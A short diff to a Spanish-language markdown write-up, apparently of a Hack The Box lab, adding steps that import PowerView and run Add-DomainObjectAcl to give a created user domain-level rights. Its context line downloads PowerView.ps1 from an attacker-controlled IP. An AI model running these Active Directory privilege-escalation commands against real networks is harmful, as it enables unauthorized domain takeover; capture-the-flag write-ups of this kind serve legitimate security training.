@@ -205,4 +205,14 @@ Invoke-WebRequest -Uri "http://10.10.14.19/PowerView.ps1" -OutFile "C:\Users\svc
 
 ```
 
+Importamos el modulo
+```shell
+Import-Module .\PowerView.ps1
+```
+
 Y ahora podremos darle los permisos al usuario creado
+```shell
+Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity jaime -Rights WriteMembers
+```
+
+### 
